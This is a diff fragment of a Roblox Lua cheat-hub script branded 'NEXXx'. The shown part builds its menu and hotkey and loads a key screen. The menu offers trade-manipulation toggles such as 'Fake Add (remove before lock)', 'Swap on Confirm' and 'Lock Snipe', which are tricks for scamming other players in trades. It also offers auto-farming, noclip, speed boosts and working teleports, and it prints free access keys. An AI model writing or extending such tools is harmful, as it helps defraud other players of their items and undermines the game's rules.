+    local PP=Instance.new("UIPadding")
+    PP.PaddingTop=UDim.new(0,8) PP.Parent=Scr
+
+    -- builders
+    local function sec(txt)
+        local f=Instance.new("Frame")
+        f.Size             = UDim2.new(0,340,0,26)
+        f.BackgroundColor3 = Color3.fromRGB(22,14,44)
+        f.ZIndex           = 12 f.Parent=Scr
+        corner(6,f)
+        local l=Instance.new("TextLabel")
+        l.Size=UDim2.new(1,-10,1,0) l.Position=UDim2.new(0,10,0,0)
+        l.BackgroundTransparency=1 l.Text=txt
+        l.TextColor3=C.accent2 l.Font=Enum.Font.GothamBold
+        l.TextSize=12 l.TextXAlignment=Enum.TextXAlignment.Left
+        l.ZIndex=13 l.Parent=f
+    end
+
+    local function tog(lbl,key,cb)
+        local b=Instance.new("TextButton")
+        b.Size             = UDim2.new(0,340,0,40)
+        b.BackgroundColor3 = C.panel
+        b.Text             = ""
+        b.AutoButtonColor  = false
+        b.ZIndex           = 12 b.Parent=Scr
+        corner(8,b) stroke(1,Color3.fromRGB(35,25,60),b)
+
+        local l=Instance.new("TextLabel")
+        l.Size=UDim2.new(1,-60,1,0) l.Position=UDim2.new(0,12,0,0)
+        l.BackgroundTransparency=1 l.Text=lbl
+        l.TextColor3=C.text l.Font=Enum.Font.Gotham
+        l.TextSize=13 l.TextXAlignment=Enum.TextXAlignment.Left
+        l.ZIndex=13 l.Parent=b
+
+        local pill=Instance.new("Frame")
+        pill.Size             = UDim2.new(0,38,0,20)
+        pill.Position         = UDim2.new(1,-50,0.5,-10)
+        pill.BackgroundColor3 = Color3.fromRGB(40,30,60)
+        pill.ZIndex=13 pill.Parent=b corner(10,pill)
+
+        local knob=Instance.new("Frame")
+        knob.Size             = UDim2.new(0,16,0,16)
+        knob.Position         = UDim2.new(0,2,0.5,-8)
+        knob.BackgroundColor3 = C.dim
+        knob.ZIndex=14 knob.Parent=pill corner(8,knob)
+
+        local on=false
+        b.MouseButton1Click:Connect(function()
+            on=not on CFG[key]=on
+            tween(knob,0.2,{Position=UDim2.new(0,on and 20 or 2,0.5,-8),BackgroundColor3=on and C.accent1 or C.dim})
+            tween(pill,0.2,{BackgroundColor3=on and Color3.fromRGB(50,20,90) or Color3.fromRGB(40,30,60)})
+            l.TextColor3=on and C.accent1 or C.text
+            if cb then cb(on) end
+        end)
+    end
+
+    local function tpbtn(lbl,pos)
+        local b=Instance.new("TextButton")
+        b.Size             = UDim2.new(0,340,0,36)
+        b.BackgroundColor3 = C.panel
+        b.Text             = "⤷  "..lbl
+        b.TextColor3       = C.text
+        b.Font             = Enum.Font.Gotham
+        b.TextSize         = 13
+        b.TextXAlignment   = Enum.TextXAlignment.Left
+        b.AutoButtonColor  = false
+        b.ZIndex           = 12 b.Parent=Scr
+        corner(8,b)
+        local p2=Instance.new("UIPadding") p2.PaddingLeft=UDim.new(0,12) p2.Parent=b
+        b.MouseButton1Click:Connect(function()
+            local ch=lp.Character if not ch then return end
+            local r=ch:FindFirstChild("HumanoidRootPart")
+            if r then r.CFrame=CFrame.new(pos) end
+        end)
+    end
+
+    -- populate
+    sec("⚠  TRADE MANIPULATION")
+    tog("Auto Accept Trades",           "AutoAccept")
+    tog("Fake Add  (remove before lock)","FakeAdd")
+    tog("Swap on Confirm",              "SwapOnConfirm")
+    tog("Lock Snipe",                   "LockSnipe")
+    tog("Auto Decline All",             "AutoDecline")
+
+    sec("⚔  FARMING")
+    tog("Auto Farm NPCs",               "AutoFarm")
+    tog("Auto Chest",                   "AutoChest")
+    tog("Fruit Sniper",                 "FruitSniper")
+
+    sec("🧍 PLAYER")
+    tog("NoClip",                       "NoClip")
+    tog("Speed  ×2",                    "SpeedMult", function(on)
+        CFG.SpeedMult = on and 2 or 1
+    end)
+
+    sec("🌐  TELEPORT")
+    tpbtn("First Sea  — Starter Island",    Vector3.new(-1300,40,920))
+    tpbtn("First Sea  — Marine Fortress",   Vector3.new(-4887,34,-3227))
+    tpbtn("Second Sea — Kingdom of Rose",   Vector3.new(-215,72,910))
+    tpbtn("Third Sea  — Port Town",         Vector3.new(5990,21,-900))
+
+    sec("ℹ  INFO")
+    local info=Instance.new("TextLabel")
+    info.Size=UDim2.new(0,340,0,52) info.BackgroundTransparency=1
+    info.Text="Made by NEXXx  •  RightShift = hide UI\nFree key: NEXX-FREE-2025  |  NEXX-PASS-HO"
+    info.TextColor3=C.dim info.Font=Enum.Font.Gotham info.TextSize=11
+    info.TextWrapped=true info.ZIndex=12 info.Parent=Scr
+
+    -- toggle hotkey
+    local vis=true
+    UIS.InputBegan:Connect(function(inp,gp)
+        if gp then return end
+        if inp.KeyCode==Enum.KeyCode.RightShift then
+            vis=not vis HF.Visible=vis
+        end
+    end)
+
+    SG:SetCore("SendNotification",{
+        Title="NEXXx", Text="Hub loaded ✓  |  RightShift = toggle", Duration=4
+    })
+end
+
+-- ── boot ──────────────────────────────────────────────────────────────────────
+run_loading(function()
+    tween(LoadFrame,0.6,{BackgroundTransparency=1})
+    for _,v in ipairs(LoadFrame:GetDescendants()) do
+        if v:IsA("GuiObject") then
+            pcall(function() tween(v,0.4,{BackgroundTransparency=1}) end)
+        end
+    end
+    task.wait(0.7)
+    LoadFrame:Destroy()
+    show_key_screen(launch_hub)
+end)
